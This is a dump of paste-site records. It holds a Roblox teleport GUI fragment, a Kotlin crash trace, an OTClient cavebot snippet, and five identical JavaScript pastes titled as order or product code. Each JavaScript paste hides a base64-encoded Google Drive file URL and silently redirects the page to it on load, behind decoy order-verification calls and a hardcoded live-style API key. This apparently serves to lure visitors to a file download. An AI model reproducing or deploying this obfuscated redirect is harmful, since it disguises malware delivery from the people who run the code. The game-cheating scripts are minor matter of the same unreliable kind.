	player.Character:MoveTo(Vector3.new(818.4539, 36.4241, -1.0231))
end)

createButton(""Close"", function()
	mainFrame.Visible = false
end)"
LRi9BQFH,Products.js,Epiphemeral,JavaScript,Friday 18th of April 2025 08:44:43 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/76130/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
JjMgdxYd,Order.js,Epiphemeral,JavaScript,Friday 18th of April 2025 08:29:20 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/65514/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
1GLMTEuU,2025-04-18T15:21:33.609473,powerampache,PHP,Friday 18th of April 2025 08:21:33 AM CDT,"1.01-79-play (79) - DB: 83
java.lang.NullPointerException: Parameter specified as non-null is null: method luci.sixsixsix.powerampache2.domain.models.User.<init>, parameter id
	at luci.sixsixsix.powerampache2.domain.models.User.<init>(Unknown Source:20)
	at luci.sixsixsix.powerampache2.data.remote.dto.UserDtoKt.toUser(UserDto.kt:94)
	at luci.sixsixsix.powerampache2.data.BaseAmpacheRepository.getUserNetwork(BaseAmpacheRepository.kt:128)
	at luci.sixsixsix.powerampache2.data.BaseAmpacheRepository$getUserNetwork$1.invokeSuspend(Unknown Source:14)
	at kotlin.coroutines.jvm.internal.BaseContinuationImpl.resumeWith(ContinuationImpl.kt:33)
	at kotlinx.coroutines.DispatchedTask.run(DispatchedTask.kt:104)
	at kotlinx.coroutines.scheduling.CoroutineScheduler.runSafely(CoroutineScheduler.kt:584)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.executeTask(CoroutineScheduler.kt:811)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.runWorker(CoroutineScheduler.kt:715)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.run(CoroutineScheduler.kt:702)

"
88v8CLfK,Market.js,Epiphemeral,JavaScript,Friday 18th of April 2025 08:13:58 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/12321/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
SwhEWHCH,Untitled,Epiphemeral,JavaScript,Friday 18th of April 2025 07:58:35 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/62539/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
jxnFKt9D,Products.js,Epiphemeral,JavaScript,Friday 18th of April 2025 07:43:13 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/79389/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
jcJk8ZiJ,Untitled,martintokio,Lua,Friday 18th of April 2025 07:42:49 AM CDT,"--Check Sausage Slot
local sausageSlots = {
  {x = 34007, y = 31092, z = 7},
  {x = 34009, y = 31092, z = 7},
  {x = 34011, y = 31092, z = 7},
  {x = 34013, y = 31092, z = 7},
  {x = 34015, y = 31092, z = 7}
}

  local player = g_game.getLocalPlayer()
  if not player then return end
  local pos = player:getPosition()
  if not pos then return end
  for _, p in ipairs(sausageSlots) do
    if pos.x == p.x and pos.y == p.y and pos.z == p.z then
      CaveBot.gotoLabel(""eatSausages"")
    end
  end
  return true"
